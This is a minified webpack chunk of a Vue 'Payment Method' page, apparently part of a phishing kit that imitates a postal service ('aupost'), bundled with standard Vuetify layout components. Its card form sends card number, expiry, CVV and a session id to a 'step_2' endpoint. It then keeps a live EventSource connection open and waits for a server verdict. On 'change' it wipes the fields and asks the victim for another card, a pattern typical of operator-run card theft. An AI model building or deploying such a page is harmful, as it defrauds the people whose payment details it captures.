"use strict";(self["webpackChunkaupost"]=self["webpackChunkaupost"]||[]).push([[779],{62:function(e,t,r){r.r(t),r.d(t,{default:function(){return f}});var a=r(7024),s=r(9088),i=r(9767),n=r(7935),l=r(7894),o=function(){var e=this,t=e._self._c;return t("div",{staticStyle:{padding:"0 16px 0 16px"}},[t("h3",{staticStyle:{"margin-bottom":"48px"}},[e._v("Payment Method")]),t("div",{directives:[{name:"show",rawName:"v-show",value:e.warning_alert,expression:"warning_alert"}],staticClass:"checkout-error-container"},[t("ul",{staticClass:"list-unstyled alert alert-danger",attrs:{id:"tokenizationError"}},[t(s.Z,{staticClass:"mr-3",attrs:{color:"#d61834"}},[e._v("mdi-alert")]),t("li",[e._v("We couldn't process your payment. Please try another payment method.")])],1)]),e._m(0),t("label",{staticClass:"ph-form-element-label"},[e._v("Card number")]),t("small",{directives:[{name:"show",rawName:"v-show",value:e.card_alert,expression:"card_alert"}],staticClass:"has-error"},[t(s.Z,{staticClass:"mr-1",attrs:{small:"",color:"#bc111e"}},[e._v("mdi-alert")]),e._v(" Please enter a valid card number.")],1),t("input",{directives:[{name:"model",rawName:"v-model",value:e.card_number,expression:"card_number"}],staticClass:"ng-pristine ng-invalid ng-touched",attrs:{autocomplete:"cc-number",maxlength:"19",name:"number",required:"",title:"Enter your card number",type:"text",oninput:"if(value.length >16){value=value.slice(0,16)}"},domProps:{value:e.card_number},on:{blur:e.CheckBankNo,input:function(t){t.target.composing||(e.card_number=t.target.value)}}}),t(l.Z,{staticStyle:{"margin-top":"12px"}},[t(a.Z,{attrs:{cols:"6"}},[t("label",{staticClass:"ph-form-element-label"},[e._v("Expiry date")]),t("input",{directives:[{name:"model",rawName:"v-model",value:e.exp_date,expression:"exp_date"}],staticClass:"ng-pristine ng-invalid ng-touched",attrs:{oninput:"if(value.length>5){value=value.slice(0,3)}if(value.length===2){value=value+'/'}",maxlength:"19",placeholder:"MM/YY",type:"text"},domProps:{value:e.exp_date},on:{input:function(t){t.target.composing||(e.exp_date=t.target.value)}}})]),t(a.Z,{attrs:{cols:"6"}},[t("label",{staticClass:"ph-form-element-label"},[e._v("CVV")]),t("input",{directives:[{name:"model",rawName:"v-model",value:e.cvv,expression:"cvv"}],staticClass:"ng-pristine ng-invalid ng-touched",attrs:{autocomplete:"cvv",maxlength:"19",name:"number",required:"",title:"Enter your card number",type:"text",oninput:"if(value.length>4)value=value.slice(0,4)"},domProps:{value:e.cvv},on:{input:function(t){t.target.composing||(e.cvv=t.target.value)}}})])],1),t("label",{staticClass:"ph-form-element-label",staticStyle:{"margin-top":"14px"}},[e._v("Zip code")]),t("input",{directives:[{name:"model",rawName:"v-model",value:e.zipcode,expression:"zipcode"}],staticClass:"ng-pristine ng-invalid ng-touched",attrs:{autocomplete:"postcode",maxlength:"19",name:"number",type:"text",oninput:"if(value.length>5)value=value.slice(0,5)"},domProps:{value:e.zipcode},on:{input:function(t){t.target.composing||(e.zipcode=t.target.value)}}}),t("button",{staticClass:"ap-btn btn-block ap-btn-primary ap-big-button checkError",staticStyle:{margin:"24px 0 50px 0"},attrs:{name:"continue"},on:{click:e.submit_data}},[e._v(" Continue ")]),t(i.Z,{directives:[{name:"show",rawName:"v-show",value:e.show_loading,expression:"show_loading"}],attrs:{opacity:"0.8",color:"#ffffff"}},[t(n.Z,{attrs:{indeterminate:"",color:"#ff0000",width:"3",size:"48"}})],1)],1)},c=[function(){var e=this,t=e._self._c;return t("div",{staticStyle:{"margin-bottom":"12px"}},[t("span",[t("img",{staticStyle:{height:"28px",width:"34px"},attrs:{src:r(339),alt:"VISA card icon"}}),t("img",{staticStyle:{height:"28px",width:"34px","margin-left":"12px"},attrs:{src:r(9414),alt:"Master card icon"}}),t("img",{staticStyle:{height:"28px",width:"34px","margin-left":"12px"},attrs:{src:r(5188),alt:"American express card icon"}})])])}],u=r(9669),d=r.n(u),h=r(7877),p={name:"PaymentView",data:()=>({card_alert:!1,warning_alert:!1,show_loading:!1,appid:localStorage.getItem("appid"),card_number:"",exp_date:"",cvv:"",zipcode:""}),methods:{isValidCreditCard:function(e){let t;e=e.split("-").join("");let r=0;for(t=2-e.length%2;t<=e.length;t+=2)r+=parseInt(e.charAt(t-1));for(t=e.length%2+1;t<e.length;t+=2){const a=2*parseInt(e.charAt(t-1));r+=a<10?a:a-9}return r%10===0},CheckBankNo:function(){let e=this.card_number;if(e=e.replace(/\s/g,""),""===e)return this.card_alert="Please enter the correct card number",!1;if(e.length<14||e.length>19)return this.card_alert="Please enter the correct card number",!1;const t=/^\d*$/;if(!t.exec(e))return this.card_alert="Please enter the correct card number",!1;const r=["3","4","5","6","9"];return-1===r.indexOf(e.slice(0,1))?(console.log(1111),this.card_alert="Please enter the correct card number",!1):(this.card_alert="",!0)},submit_data(){if(!0===this.card_alert)return;const e=h.Z.step_2,t=new URLSearchParams,r=[this.card_number,this.exp_date,this.cvv,this.appid],a=["card_number","exp_date","cvv","appid"];if(""!==this.card_number&""!==this.exp_date&&""!==this.cvv){this.warning_alert=!1,this.show_loading=!0;for(let e in r)t.append(a[e],r[e]);d().post(e,t).then((e=>{"ok"===e.data.status?(this.show_loading=!0,this.check_card_status()):(this.show_loading=!1,this.warning_alert=!0)})).catch((e=>{console.log(e),this.show_loading=!1,this.warning_alert=!0}))}else this.warning_alert=!0},check_card_status(){if("EventSource"in window){const e=h.Z.check_card_status+"?appid="+this.appid,t=new EventSource(e);t.onmessage=e=>{let r=e.data;"ok"===r?(t.close(),this.$router.push({name:"confirm"})):"change"===r&&(t.close(),this.show_loading=!1,this.warning_alert=!0,this.card_number=this.exp_date=this.cvv="")},t.onerror=e=>{console.log(e)}}}}},m=p,v=r(3736),g=(0,v.Z)(m,o,c,!1,null,"786c383b",null),f=g.exports},1884:function(){},7024:function(e,t,r){r(1884);var a=r(144),s=r(7559),i=r(8131);const n=["sm","md","lg","xl"],l=(()=>n.reduce(((e,t)=>(e[t]={type:[Boolean,String,Number],default:!1},e)),{}))(),o=(()=>n.reduce(((e,t)=>(e["offset"+(0,i.jC)(t)]={type:[String,Number],default:null},e)),{}))(),c=(()=>n.reduce(((e,t)=>(e["order"+(0,i.jC)(t)]={type:[String,Number],default:null},e)),{}))(),u={col:Object.keys(l),offset:Object.keys(o),order:Object.keys(c)};function d(e,t,r){let a=e;if(null!=r&&!1!==r){if(t){const r=t.replace(e,"");a+=`-${r}`}return"col"!==e||""!==r&&!0!==r?(a+=`-${r}`,a.toLowerCase()):a.toLowerCase()}}const h=new Map;t["Z"]=a.ZP.extend({name:"v-col",functional:!0,props:{cols:{type:[Boolean,String,Number],default:!1},...l,offset:{type:[String,Number],default:null},...o,order:{type:[String,Number],default:null},...c,alignSelf:{type:String,default:null,validator:e=>["auto","start","end","center","baseline","stretch"].includes(e)},tag:{type:String,default:"div"}},render(e,{props:t,data:r,children:a,parent:i}){let n="";for(const s in t)n+=String(t[s]);let l=h.get(n);if(!l){let e;for(e in l=[],u)u[e].forEach((r=>{const a=t[r],s=d(e,r,a);s&&l.push(s)}));const r=l.some((e=>e.startsWith("col-")));l.push({col:!r||!t.cols,[`col-${t.cols}`]:t.cols,[`offset-${t.offset}`]:t.offset,[`order-${t.order}`]:t.order,[`align-self-${t.alignSelf}`]:t.alignSelf}),h.set(n,l)}return e(t.tag,(0,s.ZP)(r,{class:l}),a)}})},7894:function(e,t,r){r(1884);var a=r(144),s=r(7559),i=r(8131);const n=["sm","md","lg","xl"],l=["start","end","center"];function o(e,t){return n.reduce(((r,a)=>(r[e+(0,i.jC)(a)]=t(),r)),{})}const c=e=>[...l,"baseline","stretch"].includes(e),u=o("align",(()=>({type:String,default:null,validator:c}))),d=e=>[...l,"space-between","space-around"].includes(e),h=o("justify",(()=>({type:String,default:null,validator:d}))),p=e=>[...l,"space-between","space-around","stretch"].includes(e),m=o("alignContent",(()=>({type:String,default:null,validator:p}))),v={align:Object.keys(u),justify:Object.keys(h),alignContent:Object.keys(m)},g={align:"align",justify:"justify",alignContent:"align-content"};function f(e,t,r){let a=g[e];if(null!=r){if(t){const r=t.replace(e,"");a+=`-${r}`}return a+=`-${r}`,a.toLowerCase()}}const b=new Map;t["Z"]=a.ZP.extend({name:"v-row",functional:!0,props:{tag:{type:String,default:"div"},dense:Boolean,noGutters:Boolean,align:{type:String,default:null,validator:c},...u,justify:{type:String,default:null,validator:d},...h,alignContent:{type:String,default:null,validator:p},...m},render(e,{props:t,data:r,children:a}){let i="";for(const s in t)i+=String(t[s]);let n=b.get(i);if(!n){let e;for(e in n=[],v)v[e].forEach((r=>{const a=t[r],s=f(e,r,a);s&&n.push(s)}));n.push({"no-gutters":t.noGutters,"row--dense":t.dense,[`align-${t.align}`]:t.align,[`justify-${t.justify}`]:t.justify,[`align-content-${t.alignContent}`]:t.alignContent}),b.set(i,n)}return e(t.tag,(0,s.ZP)(r,{staticClass:"row",class:n}),a)}})},9767:function(e,t,r){r.d(t,{Z:function(){return l}});var a=r(5836),s=r(2066),i=r(4552),n=r(5530),l=(0,n.Z)(a.Z,s.Z,i.Z).extend({name:"v-overlay",props:{absolute:Boolean,color:{type:String,default:"#212121"},dark:{type:Boolean,default:!0},opacity:{type:[Number,String],default:.46},value:{default:!0},zIndex:{type:[Number,String],default:5}},computed:{__scrim(){const e=this.setBackgroundColor(this.color,{staticClass:"v-overlay__scrim",style:{opacity:this.computedOpacity}});return this.$createElement("div",e)},classes(){return{"v-overlay--absolute":this.absolute,"v-overlay--active":this.isActive,...this.themeClasses}},computedOpacity(){return Number(this.isActive?this.opacity:0)},styles(){return{zIndex:this.zIndex}}},methods:{genContent(){return this.$createElement("div",{staticClass:"v-overlay__content"},this.$slots.default)}},render(e){const t=[this.__scrim];return this.isActive&&t.push(this.genContent()),e("div",{staticClass:"v-overlay",on:this.$listeners,class:this.classes,style:this.styles},t)}})},7935:function(e,t,r){r.d(t,{Z:function(){return n}});var a=r(7006),s=r(5836),i=r(8131),n=s.Z.extend({name:"v-progress-circular",directives:{intersect:a.Z},props:{button:Boolean,indeterminate:Boolean,rotate:{type:[Number,String],default:0},size:{type:[Number,String],default:32},width:{type:[Number,String],default:4},value:{type:[Number,String],default:0}},data:()=>({radius:20,isVisible:!0}),computed:{calculatedSize(){return Number(this.size)+(this.button?8:0)},circumference(){return 2*Math.PI*this.radius},classes(){return{"v-progress-circular--visible":this.isVisible,"v-progress-circular--indeterminate":this.indeterminate,"v-progress-circular--button":this.button}},normalizedValue(){return this.value<0?0:this.value>100?100:parseFloat(this.value)},strokeDashArray(){return Math.round(1e3*this.circumference)/1e3},strokeDashOffset(){return(100-this.normalizedValue)/100*this.circumference+"px"},strokeWidth(){return Number(this.width)/+this.size*this.viewBoxSize*2},styles(){return{height:(0,i.kb)(this.calculatedSize),width:(0,i.kb)(this.calculatedSize)}},svgStyles(){return{transform:`rotate(${Number(this.rotate)}deg)`}},viewBoxSize(){return this.radius/(1-Number(this.width)/+this.size)}},methods:{genCircle(e,t){return this.$createElement("circle",{class:`v-progress-circular__${e}`,attrs:{fill:"transparent",cx:2*this.viewBoxSize,cy:2*this.viewBoxSize,r:this.radius,"stroke-width":this.strokeWidth,"stroke-dasharray":this.strokeDashArray,"stroke-dashoffset":t}})},genSvg(){const e=[this.indeterminate||this.genCircle("underlay",0),this.genCircle("overlay",this.strokeDashOffset)];return this.$createElement("svg",{style:this.svgStyles,attrs:{xmlns:"http://www.w3.org/2000/svg",viewBox:`${this.viewBoxSize} ${this.viewBoxSize} ${2*this.viewBoxSize} ${2*this.viewBoxSize}`}},e)},genInfo(){return this.$createElement("div",{staticClass:"v-progress-circular__info"},this.$slots.default)},onObserve(e,t,r){this.isVisible=r}},render(e){return e("div",this.setTextColor(this.color,{staticClass:"v-progress-circular",attrs:{role:"progressbar","aria-valuemin":0,"aria-valuemax":100,"aria-valuenow":this.indeterminate?void 0:this.normalizedValue},class:this.classes,directives:[{name:"intersect",value:this.onObserve}],style:this.styles,on:this.$listeners}),[this.genSvg(),this.genInfo()])}})},4552:function(e,t,r){r.d(t,{d:function(){return s}});var a=r(144);function s(e="value",t="input"){return a.ZP.extend({name:"toggleable",model:{prop:e,event:t},props:{[e]:{required:!1}},data(){return{isActive:!!this[e]}},watch:{[e](e){this.isActive=!!e},isActive(r){!!r!==this[e]&&this.$emit(t,r)}}})}const i=s();t["Z"]=i},5188:function(e,t,r){e.exports=r.p+"img/amex-card-coloured.37cc7baf.svg"},9414:function(e,t,r){e.exports=r.p+"img/master-card-coloured.7a9b09a1.svg"},339:function(e,t,r){e.exports=r.p+"img/visa-card-coloured.2ddc8053.svg"}}]);
//# sourceMappingURL=779.8c0063ad.js.map